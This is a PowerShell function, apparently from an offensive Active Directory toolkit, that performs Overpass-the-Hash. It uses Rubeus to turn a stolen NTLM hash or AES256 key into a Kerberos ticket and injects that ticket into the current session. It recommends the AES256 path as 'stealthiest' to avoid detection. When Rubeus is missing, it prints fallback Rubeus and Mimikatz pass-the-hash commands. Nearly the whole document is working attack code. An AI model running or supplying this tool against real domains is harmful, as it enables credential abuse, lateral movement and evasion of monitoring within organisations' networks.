function Invoke-OverpassTheHash {
    <#
    .SYNOPSIS
        Convert an NTLM hash or AES256 key into a Kerberos TGT via Rubeus.

    .DESCRIPTION
        Requests a legitimate Kerberos TGT using a hash as the encryption key,
        then injects it into the current session via /ptt. AES256 is the
        stealthiest option (no RC4 downgrade logged).

        Falls back to printing manual Rubeus/Mimikatz commands if Rubeus.exe
        is not found in the current directory.

    .PARAMETER User
        Target username to request TGT for.

    .PARAMETER NTLMHash
        NTLM hash for RC4 Overpass-the-Hash.

    .PARAMETER AES256Key
        AES256 key for stealthier Overpass-the-Hash (no RC4 downgrade).

    .PARAMETER Domain
        Target domain. Defaults to current domain.

    .EXAMPLE
        Invoke-OverpassTheHash -User admin -NTLMHash "31d6cfe0d16ae931b73c59d7e0c089c0"
    .EXAMPLE
        Invoke-OverpassTheHash -User admin -AES256Key "aes256keyhere..." -Domain corp.local
    #>

    param(
        [Parameter(Mandatory)][string]$User,
        [string]$NTLMHash,
        [string]$AES256Key,
        [string]$Domain = (Get-ADDomain).DNSRoot
    )

    Write-Host "`n[*] Overpass-the-Hash: $Domain\$User" -ForegroundColor Cyan

    if (Test-Path ".\Rubeus.exe") {
        if ($AES256Key) {
            Write-Host "[*] Using AES256 (stealthiest)" -ForegroundColor Green
            & .\Rubeus.exe asktgt /user:$User /domain:$Domain /aes256:$AES256Key /ptt /opsec
        }
        elseif ($NTLMHash) {
            Write-Host "[*] Using NTLM hash" -ForegroundColor Yellow
            & .\Rubeus.exe asktgt /user:$User /domain:$Domain /rc4:$NTLMHash /ptt
        }
    }
    else {
        Write-Host "[-] Rubeus.exe not found. Manual commands:" -ForegroundColor Red
        Write-Host "    Rubeus.exe asktgt /user:$User /rc4:$NTLMHash /ptt"
        Write-Host "    # Or with Mimikatz:"
        Write-Host "    sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NTLMHash /run:cmd.exe"
    }

    Write-Host "`n[*] Verify: klist" -ForegroundColor Cyan
    klist 2>$null
}